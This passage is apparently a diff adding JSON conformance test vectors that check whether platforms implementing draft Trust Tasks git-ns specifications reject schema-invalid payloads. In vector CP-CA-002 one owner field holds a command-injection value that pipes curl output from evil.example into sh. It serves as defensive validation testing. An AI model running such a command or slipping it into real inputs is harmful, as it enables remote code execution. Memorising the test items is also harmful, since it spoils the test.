@@ -1,0 +1,1498 @@
+{
+ "format": "tt-conformance-vectors/0.1",
+ "group": "CP-CA",
+ "family": "coverage",
+ "clock": {
+  "start": "2026-11-12T10:00:00Z"
+ },
+ "vectors": [
+  {
+   "id": "CP-CA-001",
+   "title": "git-ns/bridge/event 0.6: the namespace the request names exists, and a schema-invalid payload is still refused (seeded probe of CX-CA-022)",
+   "tier": 1,
+   "spec": [
+    "Seeded-state probe: the first step(s) create the object the later steps name, through the task the platform serves for it, so the later answers are not an object lookup failing. The probe asks only one thing: with the object present, is a schema-invalid payload refused with malformedRequest (or permissionDenied)? An answer of malformedRequest shows the platform looks the object up first and validates afterwards (an order SPEC.md 7.2 does not fix); an answer from the task itself or a success shows it does not validate that payload (7.2 item 2 is a MUST). Advisory.",
+    "Re-asks CX-CA-022: the same payloads, kept only where the identifier they carry is itself valid, against an object the first step(s) created",
+    "payload.invalid-examples.json of git-ns/bridge/event 0.6 (task-force repository origin/main bd0c05013, specification status draft): 25 example(s) that the payload schema also rejects",
+    "SPEC.md:1012 (7.2 item 2: validate the payload against the schema of the type)",
+    "specs/git-ns/bridge/event/0.6/spec.md (task-force repository origin/main bd0c05013, specification status draft)",
+    "The examples are the task force's own text, not derived from the registry schema",
+    "SPEC.md 7.2 items 2 and 10 do not order payload validation against the authorisation decision, and 8.3 gives permissionDenied for a requester who is not authorised, so this vector accepts malformedRequest, permissionDenied or (where the task's front matter names one) the task's own standing code, and fixes no check order. An answer from an object lookup (taskFailed, a not-found code) is not accepted: it is what a consumer that never validated the payload gives (7.2 item 2 is a MUST). noSideEffect still holds."
+   ],
+   "clarify": null,
+   "requires": [
+    "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+    "https://trusttasks.org/spec/git-ns/namespace/bind/0.2",
+    "optional:seed.defaults",
+    "optional:authorised"
+   ],
+   "mutants": [
+    "noPayloadValidation"
+   ],
+   "source": {
+    "slug": "git-ns/bridge/event",
+    "version": "0.6",
+    "channel": "proposed",
+    "profile": "coverage",
+    "ref": "pkg:@openvtc/trust-tasks@0.29.0#https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+    "pinnedDigest": "sha256:78d20ffde2018a81eea0a36c5b85d10a4408f2eb66b96d90ee33aee374f7b661",
+    "tfRef": {
+     "repoPath": "specs/git-ns/bridge/event/0.6/spec.md",
+     "commit": "bd0c05013277b83f23fa90db699671ebb48dd24c",
+     "status": "draft"
+    },
+    "note": "Coverage family CA (Community administration): the grouping is a suite proposal (docs/22) and advisory; the task is a Trust Tasks specification (tfRef, status draft). Evidence basis: the task force's own invalid payload examples. Seeded-state probe of CX-CA-022: advisory; a probe vector is derived from the held vector and adds no independent evidence of the schema.",
+    "tfCommit": "bd0c05013277b83f23fa90db699671ebb48dd24c",
+    "specHash": "sha256:7a4cc94344660d3dff30523b7022ef757cac982659c217ec799d06ed7b98d183",
+    "schemaHash": "sha256:0faa09453bc2af744023e256fc7a857a1353d335899abc8dd90d6096cf5fde0e"
+   },
+   "steps": [
+    {
+     "send": {
+      "document": {
+       "id": "$id(seed1)",
+       "type": "https://trusttasks.org/spec/git-ns/namespace/bind/0.2",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "forge": "github.com",
+        "owner": "$mint(nsowner)",
+        "mode": "manual"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "response",
+      "type": "https://trusttasks.org/spec/git-ns/namespace/bind/0.2#response",
+      "orRefusal": [
+       "git-ns:policyDenied"
+      ]
+     },
+     "capture": {
+      "ns": "/payload/namespace/id"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px1)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "repository.renamed",
+         "forgeId": "1"
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px2)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "repoRenamed",
+         "forgeId": "1",
+         "to": "github.com/acme/new"
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px3)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "drift": []
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px4)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "installationRemoved"
+        },
+        "drift": [
+         {
+          "type": "somethingOdd",
+          "resource": "github.com/acme/widgets"
+         }
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px5)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported"
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px6)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "admin",
+          "maintain": "maintain",
+          "commit": "none"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px7)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "admin",
+          "maintain": "maintain",
+          "commit": "none"
+         },
+         "ladder": [
+          "write",
+          "write"
+         ]
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px8)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "none",
+          "maintain": "none",
+          "commit": "none"
+         },
+         "ladder": []
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px9)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "admin",
+          "maintain": "maintain",
+          "commit": "none",
+          "nsAdmin": "admin"
+         },
+         "ladder": [
+          "read",
+          "triage",
+          "write",
+          "maintain",
+          "admin"
+         ]
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px10)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "admin",
+          "maintain": "maintain"
+         },
+         "ladder": [
+          "read",
+          "triage",
+          "write",
+          "maintain",
+          "admin"
+         ]
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px11)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "owner",
+          "maintain": "maintain",
+          "commit": "none"
+         },
+         "ladder": [
+          "read",
+          "triage",
+          "write",
+          "maintain",
+          "admin"
+         ]
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px12)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "admin",
+          "maintain": "maintain",
+          "commit": "none"
+         },
+         "ladder": [
+          "read",
+          "triage",
+          "write",
+          "maintain",
+          "admin"
+         ],
+         "repos": [
+          {
+           "resource": "github.com/acme",
+           "roleMap": {
+            "own": "admin",
+            "maintain": "maintain",
+            "commit": "none"
+           }
+          }
+         ]
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px13)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "roleMapReported",
+         "roleMap": {
+          "own": "admin",
+          "maintain": "maintain",
+          "commit": "none"
+         },
+         "ladder": [
+          "read",
+          "triage",
+          "write",
+          "maintain",
+          "admin"
+         ],
+         "stale": [
+          "github.com/acme/widgets",
+          "github.com/acme/widgets"
+         ]
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px14)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 0,
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px15)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": "42",
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px16)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "synchronize",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px17)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px18)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "opened",
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px19)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px20)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "number": 42,
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px21)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "opened",
+         "author": "eve-dev",
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         }
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px22)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "draft": "yes"
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px23)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "fromFork": 1
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px24)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "pullRequestOpened",
+         "forgeId": "812736451",
+         "resource": "github.com/acme/widgets",
+         "number": 42,
+         "action": "opened",
+         "author": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "actor": {
+          "forge": "github.com",
+          "id": "5550123",
+          "login": "eve-dev"
+         },
+         "title": "Add a feature"
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px25)",
+       "type": "https://trusttasks.org/spec/git-ns/bridge/event/0.6",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "event": {
+         "type": "bindCompleted",
+         "jobId": "job_1",
+         "ownerId": "91827364",
+         "kind": "organization",
+         "supersedes": []
+        }
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    }
+   ]
+  },
+  {
+   "id": "CP-CA-002",
+   "title": "git-ns/repo/adopt 0.3: the namespace the request names exists, and a schema-invalid payload is still refused (seeded probe of CX-CA-031)",
+   "tier": 1,
+   "spec": [
+    "Seeded-state probe: the first step(s) create the object the later steps name, through the task the platform serves for it, so the later answers are not an object lookup failing. The probe asks only one thing: with the object present, is a schema-invalid payload refused with malformedRequest (or permissionDenied)? An answer of malformedRequest shows the platform looks the object up first and validates afterwards (an order SPEC.md 7.2 does not fix); an answer from the task itself or a success shows it does not validate that payload (7.2 item 2 is a MUST). Advisory.",
+    "Re-asks CX-CA-031: the same payloads, kept only where the identifier they carry is itself valid, against an object the first step(s) created",
+    "payload.invalid-examples.json of git-ns/repo/adopt 0.3 (task-force repository origin/main bd0c05013, specification status draft): 11 example(s) that the payload schema also rejects",
+    "SPEC.md:1012 (7.2 item 2: validate the payload against the schema of the type)",
+    "specs/git-ns/repo/adopt/0.3/spec.md (task-force repository origin/main bd0c05013, specification status draft)",
+    "The examples are the task force's own text, not derived from the registry schema",
+    "SPEC.md 7.2 items 2 and 10 do not order payload validation against the authorisation decision, and 8.3 gives permissionDenied for a requester who is not authorised, so this vector accepts malformedRequest, permissionDenied or (where the task's front matter names one) the task's own standing code, and fixes no check order. An answer from an object lookup (taskFailed, a not-found code) is not accepted: it is what a consumer that never validated the payload gives (7.2 item 2 is a MUST). noSideEffect still holds."
+   ],
+   "clarify": null,
+   "requires": [
+    "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+    "https://trusttasks.org/spec/git-ns/namespace/bind/0.2",
+    "optional:seed.defaults",
+    "optional:authorised"
+   ],
+   "mutants": [
+    "noPayloadValidation"
+   ],
+   "source": {
+    "slug": "git-ns/repo/adopt",
+    "version": "0.3",
+    "channel": "proposed",
+    "profile": "coverage",
+    "ref": "pkg:@openvtc/trust-tasks@0.29.0#https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+    "pinnedDigest": "sha256:2ed5207bf0af7e6245c24c8d43642d96e8edbc0957d7756f03855a45afc4bb9c",
+    "tfRef": {
+     "repoPath": "specs/git-ns/repo/adopt/0.3/spec.md",
+     "commit": "bd0c05013277b83f23fa90db699671ebb48dd24c",
+     "status": "draft"
+    },
+    "note": "Coverage family CA (Community administration): the grouping is a suite proposal (docs/22) and advisory; the task is a Trust Tasks specification (tfRef, status draft). Evidence basis: the task force's own invalid payload examples. Seeded-state probe of CX-CA-031: advisory; a probe vector is derived from the held vector and adds no independent evidence of the schema.",
+    "tfCommit": "bd0c05013277b83f23fa90db699671ebb48dd24c",
+    "specHash": "sha256:d0bb6a2729f1719de0741aec9c76a4b83ecdf89b2739af23b0009b3075423d73",
+    "schemaHash": "sha256:55f0e10be2496c8ea4c8c262c08c678d79336f26c6f3b3916fd4aa0254af2bbb"
+   },
+   "steps": [
+    {
+     "send": {
+      "document": {
+       "id": "$id(seed1)",
+       "type": "https://trusttasks.org/spec/git-ns/namespace/bind/0.2",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "forge": "github.com",
+        "owner": "$mint(own_acme)",
+        "mode": "manual"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "response",
+      "type": "https://trusttasks.org/spec/git-ns/namespace/bind/0.2#response",
+      "orRefusal": [
+       "git-ns:policyDenied"
+      ]
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px1)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": []
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px3)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": [
+         "did:webvh:QmAliceScid1:acme-vtc.example:alice",
+         "did:webvh:QmAliceScid1:acme-vtc.example:alice"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px4)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": [
+         "alice"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px5)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": [
+         "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px6)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": [
+         "did:web:acme-vtc.example:bob evil"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px7)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": [
+         "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px8)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/adopt/0.3",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "resource": "github.com/$mint(own_acme)/widgets",
+        "owners": [
+         "did:WebVH:QmBobScid2:acme-vtc.example:bob"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    }
+   ]
+  },
+  {
+   "id": "CP-CA-003",
+   "title": "git-ns/repo/create 0.4: the namespace the request names exists, and a schema-invalid payload is still refused (seeded probe of CX-CA-033)",
+   "tier": 1,
+   "spec": [
+    "Seeded-state probe: the first step(s) create the object the later steps name, through the task the platform serves for it, so the later answers are not an object lookup failing. The probe asks only one thing: with the object present, is a schema-invalid payload refused with malformedRequest (or permissionDenied)? An answer of malformedRequest shows the platform looks the object up first and validates afterwards (an order SPEC.md 7.2 does not fix); an answer from the task itself or a success shows it does not validate that payload (7.2 item 2 is a MUST). Advisory.",
+    "Re-asks CX-CA-033: the same payloads, kept only where the identifier they carry is itself valid, against an object the first step(s) created",
+    "payload.invalid-examples.json of git-ns/repo/create 0.4 (task-force repository origin/main bd0c05013, specification status draft): 8 example(s) that the payload schema also rejects",
+    "SPEC.md:1012 (7.2 item 2: validate the payload against the schema of the type)",
+    "specs/git-ns/repo/create/0.4/spec.md (task-force repository origin/main bd0c05013, specification status draft)",
+    "The examples are the task force's own text, not derived from the registry schema",
